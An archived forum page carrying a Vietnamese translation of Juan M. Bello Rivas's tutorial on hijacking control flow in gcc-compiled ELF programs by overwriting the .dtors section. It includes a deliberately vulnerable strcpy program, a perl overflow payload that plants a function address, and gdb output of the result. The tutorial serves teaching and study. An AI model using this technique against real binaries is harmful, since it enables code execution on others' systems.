<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"> 

<html>
<head>
<meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
<meta name="description" content="HVA Reading Room">
<meta name="keywords" content=", reading room, hva, hvaonline, hvazone, hvaforum">
<meta name="resource-type" content="document">
<meta name="distribution" content="global">
<meta name="robots" content="index,follow">
<meta name="rating" content="general">
<style type="text/css">
<!-- 
@import url( "http://www.hvaonline.net/hvaonline/templates/viet/styles/style.css");
-->
</style>
<style type="text/css">
<!--
@import url("http://www.hvaonline.net/hvaonline/templates/viet/styles/en_US.css");
-->
</style>
<title> - .:: HVAOnline ::.</title>

</head>
<body class="en_US">


<!--
Original theme from phpBB (http://www.phpbb.com) subSilver
Created by subBlue design
http://www.subBlue.com
Modifications by JForum Team 
Extended and customised by HVA Team
Added more features and Black Silver theme designed by HVA
-->
<table width="100%" border="0" cols="2">
	<tr align="right">
		<td class="copyright">
			English
			| 
			<a href="/hvaonline/jforum.html?module=forums&amp;action=setLang&amp;lang=vi_VN" rel="nofollow">Vietnamese</a>
		</td>
	</tr>
</table>
<table width="100%" border="0" align="center">
	<tr>
        <td width="100%" align="center" valign="middle">
			<a href="http://www.hvaonline.net" title="[Logo]"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/hvabanner-final.gif" alt="banner" /></a>
		</td>
	</tr>

	<tr>
		<td>
<table cellspacing="0" cellpadding="0" width="80%" align="center" border="0">

		<tr height="15">
			<th colspan="2" class="thportal" align="left"><span class="readingheader">&nbsp;.::Exploit::.</span></th>
		    <th class="thportal" align="center">
				<span class="readingheader">
					 Overwriting the .dtors section <a name="topPage" id="topPage"></a>
				</span>
			</th>
		    <th class="thportal" align="right">
				<a href="/hvaonline/posts/list/0/158.html#549" target="_blank">
				<img src="/hvaonline/templates/viet/images/goright.gif" align="absbottom" border="0" alt="Go to original post" title="Go to original post"/></a> 
				<img src="/hvaonline/templates/viet/images/what.gif" align="absbottom" border="0" alt="Author: Juan M. Bello Rivas  - Translator: SeekZero  - Entry Date: 13/02/2009 08:59:24" title="Author: Juan M. Bello Rivas  - Translator: SeekZero  - Entry Date: 13/02/2009 08:59:24"/>
			</th>
		</tr>
</table>

<table cellspacing="0" cellpadding="5" width="80%" align="center" border="0">
		<tr>
		    <td align="left" colspan="2" class="readingborderBottom">
				<table cellspacing="0" cellpadding="10" width="95%" align="center" border="0">
					<tr>
						<td align="left">
							<div class="postbody">Overwriting the .dtors section by Juan M. Bello Rivas <br/>              Dịch sang tiếng Việt: SeekZero<br/> -------------------------------------------------------------------------------<br/> <br/> <br/> Giới thiệu<br/> ----------<br/> <br/> Bài viết này trình bày một cách ngắn gọn một kỹ thuật dùng để chiếm quyền điều<br/> khiển và đổi hướng thực thi của một chương trình C được biên dịch bằng gcc.<br/> Người đọc xem như đã quen thuộc với kỹ thuật tràn bộ đệm cơ bản và định dạng<br/> ELF.<br/> <br/> <br/> Tổng quan<br/> ---------<br/> <br/> gcc cung cấp một số kiểu thuộc tính (attributes) cho hàm, đặc biệt hai trong<br/> số đó làm chúng ta quan tâm là: cấu tử (constructor) và huỷ tử (destructor).<br/> Các thuộc tính này phải được lập trình viên mô tả theo cách tương tự như sau:<br/> <br/>         static void start(void) __attribute__ ((constructor));<br/>         static void stop(void) __attribute__ ((destructor));<br/> <br/> Hàm với thuộc tính 'constructor' sẽ được thực thi trước hàm main(), trong khi<br/> các hàm được khai báo với thuộc tính 'destructor' sẽ được thực thi ngay sau<br/> hàm main().<br/> <br/> Khi tạo các file thực thi dạng ELF, đặc điểm này sẽ được thể hiện trong hai<br/> vùng khác nhau là: .ctors và .dtors. Cả hai vùng sẽ có cách sắp xếp như sau:<br/> <br/>     0xffffffff <function address> <another function address> ... 0x00000000<br/> <br/> LƯU Ý: Nếu bạn muốn biết tường tận về điều này, bạn nên xem mã nguồn<br/> gcc-2.95.2/gcc/collect2.c.<br/> <br/> Bắt đầu từ đây, có một số điểm cần quan tâm:<br/>     * .ctors và .dtors sẽ được ánh xạ (map) vào không gian bộ nhớ của tiến<br/>     trình thực thi và mặc định là vùng ghi được.<br/>     * Các vùng này không bị xoá khi sử dụng lệnh strip(1) với file thực thi<br/>     * Chúng ta không quan tâm người viết ra chương trình có tạo các hàm làm<br/>     cấu tử hoặc huỷ tử hay không vì cả hai vùng này cũng đều tồn tại và được<br/>     ánh xạ vào bộ nhớ.<br/> <br/> <br/> Khảo sát chi tiết<br/> -----------------<br/> <br/> Chúng ta sẽ minh họa những gì đã đề cập ở trên.<br/> <br/> $ cat &gt; yopta.c &lt;<EOF><br/> #include <stdio.h><br/> #include <stdlib.h><br/> <br/> static void start(void) __attribute__ ((constructor));<br/> static void stop(void) __attribute__ ((destructor));<br/> <br/> int<br/> main(int argc, char *argv[])<br/> {<br/>         printf("start == %p\n", start);<br/>         printf("stop == %p\n", stop);<br/> <br/>         exit(EXIT_SUCCESS);<br/> }<br/> <br/> void<br/> start(void)<br/> {<br/>         printf("hello world!\n");<br/> }<br/> <br/> void<br/> stop(void)<br/> {<br/>         printf("goodbye world!\n");<br/> }<br/> <br/> EOF<br/> $ gcc -o yopta yopta.c<br/> $ ./yopta<br/> hello world!<br/> start == 0x8048480<br/> stop == 0x80484a0<br/> goodbye world!<br/> $ objdump -h yopta<br/>                                        .<br/>                                        .<br/>                                        .<br/>  14 .data         0000000c  08049558  08049558  00000558  2**2<br/>                   CONTENTS, ALLOC, LOAD, DATA<br/>  15 .eh_frame     00000004  08049564  08049564  00000564  2**2<br/>                   CONTENTS, ALLOC, LOAD, DATA<br/>  16 .ctors        0000000c  08049568  08049568  00000568  2**2<br/>                   CONTENTS, ALLOC, LOAD, DATA<br/>  17 .dtors        0000000c  08049574  08049574  00000574  2**2<br/>                   CONTENTS, ALLOC, LOAD, DATA<br/>  18 .got          00000024  08049580  08049580  00000580  2**2<br/>                   CONTENTS, ALLOC, LOAD, DATA<br/>                                        .<br/>                                        .<br/>                                        .<br/> $ objdump -s -j .dtors yopta<br/> <br/> yopta:     file format elf32-i386<br/> <br/> Contents of section .dtors:<br/>  8049574 ffffffff a0840408 00000000           ............<br/> <br/> Ta thấy địa chỉ của hàm stop() được lưu trong .dtors như đã đề cập ở trên. Mục<br/> đích của chúng ta là khai thác chương trình vì vậy từ đây chúng ta sẽ không<br/> quan tâm đến .ctors vì nó thực sự không có ích lợi gì cả.<br/> <br/> Chúng ta sẽ thử một chương trình bình thường không có các hàm thuộc tính này<br/> (được khai báo tường minh):<br/> <br/> $ cat &gt; bleh.c &lt;<EOF><br/> #include <stdio.h><br/> #include <stdlib.h><br/> #include <sys/types.h><br/> <br/> static void bleh(void);<br/> <br/> int<br/> main(int argc, char *argv[])<br/> {<br/>         static u_char buf[] = "bleh";<br/> <br/>         if (argc &lt; 2)<br/>                 exit(EXIT_FAILURE);<br/> <br/>         strcpy(buf, argv[1]);<br/> <br/>         exit(EXIT_SUCCESS);<br/> }<br/> <br/> void<br/> bleh(void)<br/> {<br/>         printf("goffio!\n");<br/> }<br/> EOF<br/> $ gcc -o bleh bleh.c<br/> $ ./bleh<br/> $ objdump -h bleh<br/>                                        .<br/>                                        .<br/>                                        .<br/>  17 .dtors        00000008  0804955c  0804955c  0000055c  2**2<br/>                   CONTENTS, ALLOC, LOAD, DATA<br/>                                        .<br/>                                        .<br/>                                        .<br/> <br/> Tốt! .dtors vẫn còn đó dù không có hàm huỷ tử nào được khai báo. Hãy xem nội<br/> dung của nó:<br/> <br/> $ objdump -s -j .dtors bleh<br/> <br/> bleh:     file format elf32-i386<br/> <br/> Contents of section .dtors:<br/>  804955c ffffffff 00000000                    ........<br/> <br/> Chỉ có các tag bắt đầu và kết thúc, không có địa chỉ hàm nào được mô tả ở đây.<br/> <br/> Có thể thấy là hơi kỳ quặc khi ở trên ta khai báo biến "buf" vừa là static lại<br/> vừa được khởi trị. Bằng cách này chúng ta sẽ làm buf được lưu trong vùng<br/> .data, rất gần với vùng .dtors ta đang nhắm tới. Nhờ đó chúng ta có thể đạt<br/> được mục đích dễ dàng bằng cách làm tràn bộ đệm buf. Đây không phải là con<br/> đường duy nhất để ghi lên vùng .dtors, gần như mọi cách bạn có thể thực hiện<br/> để ghi lên không gian bộ nhớ của tiến trình đều dùng được (tấn công bằng định<br/> dạng chuỗi, strcpy trực tiếp bằng cách trở về hàm libc, làm hỏng malloc chunk,<br/> ...). Cách được chọn sử dụng ở đây là một cách đơn giản nhằm để minh hoạ.<br/> <br/> Mục tiêu bây giờ là làm thế nào có thể thực thi đoạn mã trong hàm bleh() (sẽ<br/> không bao giờ được gọi trong điều kiện bình thường) bằng cách tạo một entry<br/> trong .dtors trỏ đến nó. Để đạt được điều đó chúng ta sẽ không đụng đến tag<br/> bắt đầu và chỉ ghi đè lên tag kết thúc (0x00000000).<br/> <br/> $ objdump --syms bleh | egrep 'text.*bleh'<br/> 080484b0 l     F .text  0000001a              bleh<br/> <br/> Có thể thấy hàm bleh() có địa chỉ 0x080484b0. Hãy bắt đầu khai thác lỗ hổng:<br/> <br/> $ ./bleh `perl -e 'print "A" x 24; print "\xb0\x84\x04\x08";'`<br/> goffio!<br/> Segmentation fault (core dumped)<br/> <br/> Thử nghiệm đã thành công như chúng ta mong đợi, nhưng có lẽ tốt hơn là nên xem<br/> xét kỹ lưỡng core do tiến trình tạo ra và xem những gì đã bị thay đổi.<br/> <br/> $ gdb bleh core<br/> GNU gdb 5.0<br/> Copyright 2000 Free Software Foundation, Inc.<br/> GDB is free software, covered by the GNU General Public License, and you are<br/> welcome to change it and/or distribute copies of it under certain conditions.<br/> Type "show copying" to see the conditions.<br/> There is absolutely no warranty for GDB.  Type "show warranty" for details.<br/> This GDB was configured as "i686-pc-linux-gnu"...<br/> Core was generated by `./bleh AAAAAAAAAAAAAAAAAAAAAAAA°<br/>                                                       '.<br/> Program terminated with signal 11, Segmentation fault.<br/> Reading symbols from /lib/libc.so.6...done.<br/> Loaded symbols for /lib/libc.so.6<br/> Reading symbols from /lib/ld-linux.so.2...done.<br/> Loaded symbols for /lib/ld-linux.so.2<br/> #0  0x40013ed8 in ?? ()<br/> (gdb) bt<br/> #0  0x40013ed8 in ?? ()<br/> #1  0x8048521 in _fini ()<br/> #2  0x4003c25a in exit (status=0) at exit.c:57<br/> #3  0x80484a3 in main ()<br/> #4  0x400339cb in __libc_start_main (main=0x8048460 <main>, argc=2,<br/> argv=0xbffff8a4, init=0x80482e0 &lt;_init&gt;, fini=0x804850c &lt;_fini&gt;,<br/> rtld_fini=0x4000ae60 &lt;_dl_fini&gt;, stack_end=0xbffff8<br/> 9c) at ../sysdeps/generic/libc-start.c:92<br/> (gdb) maintenance info sections<br/> Exec file:<br/>     `/home/rwx/tmp/bleh', file type elf32-i386.<br/>                                        .<br/>                                        .<br/>                                        .<br/>     0x0804953c-&gt;0x08049550 at 0x0000053c: .data ALLOC LOAD DATA HAS_CONTENTS<br/>     0x08049550-&gt;0x08049554 at 0x00000550: .eh_frame ALLOC LOAD DATA HAS_CONTENTS<br/>     0x08049554-&gt;0x0804955c at 0x00000554: .ctors ALLOC LOAD DATA HAS_CONTENTS<br/>     0x0804955c-&gt;0x08049564 at 0x0000055c: .dtors ALLOC LOAD DATA HAS_CONTENTS<br/>     0x08049564-&gt;0x0804958c at 0x00000564: .got ALLOC LOAD DATA HAS_CONTENTS<br/>                                        .<br/>                                        .<br/>                                        .<br/> <br/> Chúng ta sẽ xem xét những gì đã bị ghi đè<br/> <br/> (gdb) x/x 0x08049550<br/> 0x8049550 <force_to_data>:      0x41414141<br/> <br/> Đây là nội dung của vùng .eh_frame (gcc sử dụng để lưu các con trỏ xử lý biệt<br/> lệ (exception) cho các ngôn ngữ có hỗ trợ chúng)<br/> <br/> (gdb) x/x 0x08049554<br/> 0x8049554 &lt;__CTOR_LIST__&gt;:      0x41414141<br/> (gdb) x/8x 0x0804955c<br/> 0x804955c &lt;__DTOR_LIST__&gt;:      0x41414141      0x080484b0      0x08049500<br/>  0x40013ed0<br/> 0x804956c &lt;_GLOBAL_OFFSET_TABLE_+8&gt;:    0x4000a960      0x400fb550      0x08048<br/> 336      0x400338cc<br/> (gdb)<br/> <br/> Như đã thấy, chúng ta không quan tâm đặt tag bắt đầu 0xfffffff ở vị trí tương<br/> ứng của nó và điều đó hoàn toàn không cần thiết, chỉ cần đặt địa chỉ của<br/> bleh() vào đúng chỗ, chúng ta sẽ làm đoạn mã được thực thi. Cũng lưu ý rằng<br/> tiến trình bị segfault ngay sau _fini(), điều này rõ ràng là do nó tiếp tục<br/> tìm đến tag kết thúc (0x00000000) - lúc này đã không còn tồn tại - và nhảy đến<br/> các địa chỉ kế tiếp ngay sau địa chỉ của bleh() (các địa chỉ này được xác định<br/> trong bảng GOT - Global Offset Table).<br/> <br/> <br/> Kết luận<br/> --------<br/> <br/> Bài viết đã trình bày một cách khác để thực thi các đoạn shellcode được chèn<br/> vào chương trình. Kỹ thuật này có một số ưu điểm:<br/> <br/>     * Nếu file thực thi có thể đọc được, sẽ rất dễ để xác định chính xác vị<br/>     trí chúng ta muốn ghi vào và trỏ đến đoạn shellcode, chỉ cần xem file<br/>     thực thi dạng ELF và xác định vị trí của vùng .dtors là đủ. Trong trường<br/>     hợp này tính tin cậy (khả năng thành công) của trình khai thác lỗi tăng<br/>     lên đáng kể.<br/>     * Đơn giản hơn so với các kỹ thuật khác như ghi đè một entry trong bảng<br/>     GOT.<br/> <br/> Và những nhược điểm:<br/> <br/>     * Chương trình bị lỗi phải được biên dịch và liên kết bằng GNU gcc<br/>     * Trong một số trường hợp có thể gặp khó khăn để tìm một nơi để chứa<br/>     shellcode cho đến khi chương trình thoát ra.<br/> <br/>         Have fun! <img src="/hvaonline/images/smilies/b5e9b4f86ce43ca65bd79c894c4a924c.gif" border="0" alt="smilie" align="absbottom"><br/> <br/> </div>
						</td>
					</tr>

					<tr>
						<td align="left"><a href="http://digg.com/submit?phrase=2&url=http://www.hvaonline.net/hvaonline/readingRoom/item/549.html"><img src="/hvaonline/templates/viet/images/digg.gif" align="texttop" alt="[digg]" title="[digg]"></a>
<a href="http://del.icio.us/post?url=http://www.hvaonline.net/hvaonline/readingRoom/item/549.html"><img src="/hvaonline/templates/viet/images/delicious.gif" align="texttop" alt="[delicious]" title="[delicious]"></a>
<a href="http://www.google.com/bookmarks/mark?op=edit&output=popup&bkmk=http://www.hvaonline.net/hvaonline/readingRoom/item/549.html"><img src="/hvaonline/templates/viet/images/google.gif" align="texttop" alt="[google]" title="[google]"></a>
<a href="http://bookmarks.yahoo.com/toolbar/savebm?opener=tb&u=http://www.hvaonline.net/hvaonline/readingRoom/item/549.html"><img src="/hvaonline/templates/viet/images/yahoo.gif" align="texttop" alt="[yahoo]" title="[yahoo]"></a>
<a href="http://technorati.com/faves?add=http://www.hvaonline.net/hvaonline/readingRoom/item/549.html"><img src="/hvaonline/templates/viet/images/technorati.gif" align="texttop" alt="[technorati]" title="[technorati]"></a>
<a href="http://reddit.com/submit?url=http://www.hvaonline.net/hvaonline/readingRoom/item/549.html"><img src="/hvaonline/templates/viet/images/reddit.gif" align="texttop" alt="[reddit]" title="[reddit]"></a>
<a href="http://www.stumbleupon.com/submit?url=http://www.hvaonline.net/hvaonline/readingRoom/item/549.html"><img src="/hvaonline/templates/viet/images/stumbleupon.gif" align="texttop" alt="[stumbleupon]" title="[stumbleupon]"></a></td>
					</tr>
				</table>
			</td>
		</tr>



		<tr>
			<td align="left" valign="top">
				<a href="#topPage"><img src="/hvaonline/templates/viet/images/goup.gif" align="absbottom" border="0" alt="Go to top" title="Go to top"></a>
				<a href="/hvaonline/posts/list/0/158.html#549" target="_blank"><img src="/hvaonline/templates/viet/images/goright.gif" border="0" align="absbottom" alt="Go to original post" title="Go to original post"></a> 
				&nbsp;
			</td>
			<td align="right">	<table cellspacing="0" cellpadding="0" border="0">
		<tr>			  
			<td nowrap="nowrap">
				<form action="" name="f" id="f" accept-charset="UTF-8">
					<select onchange="if(this.options[this.selectedIndex].value > 0){ document.location = '/hvaonline/readingRoom/show/'+ this.options[this.selectedIndex].value +'.html'; }" name="select">
						<option value="0" selected="selected">Go to Category</option>	
						<option value="0">------------------------</option>	
								<option value="1">Defense</option>
								<option value="2">Exploit</option>
								<option value="3">Reverse Engineering</option>
								<option value="4">*nix</option>
								<option value="5">Windows</option>
								<option value="6">Networking</option>
								<option value="7">Others</option>
					</select>
				</form>
			</td>
		</tr>
	</table>
</td>
		</tr>
</table>
<script type="text/javascript">
		var ctlTop = false;
		var ctlBt = false;

		function activateControllerTop()
		{
			ctlTop = !ctlTop;
			document.getElementById("controllerTop").style.display = (ctlTop ? "" : "none");
			document.getElementById("controllerTop").style.display = (ctlTop ? "" : "none");
			document.getElementById("controllerTop").style.display = (ctlTop ? "" : "none");

			if (ctlTop) {
				document.location = document.location + "#ctlTop";
			}
		}

		function activateControllerBottom()
		{
			ctlBt = !ctlBt;
			document.getElementById("controllerBottom").style.display = (ctlBt ? "" : "none");
			document.getElementById("controllerBottom").style.display = (ctlBt ? "" : "none");
			document.getElementById("controllerBottom").style.display = (ctlBt ? "" : "none");

			if (ctlBt) {
				document.location = document.location + "#ctlBt";
			}
		}
</script>

	<tr>	
		<td align="center">
		<br>
					</td>
	</tr>

	<tr>
		<td align="center">
			<span class="copyright">Powered by JForum - Extended by <a href="MailTo:lienlac@hvaonline.net">HVAOnline</a><br>
			&nbsp;hvaonline.net&nbsp; | &nbsp;hvaforum.net&nbsp; | &nbsp;hvazone.net&nbsp; | &nbsp;hvanews.net&nbsp; | &nbsp;vnhacker.org<br>
			1999 - 2013 &copy;
			v2012|0504|218|
		  </span>
	  </td>
	</tr>
<iframe src="/hvaonline/templates/ping_session.jsp" height="0" width="0" frameborder="0" scrolling="no"></iframe>
</body>
</html>
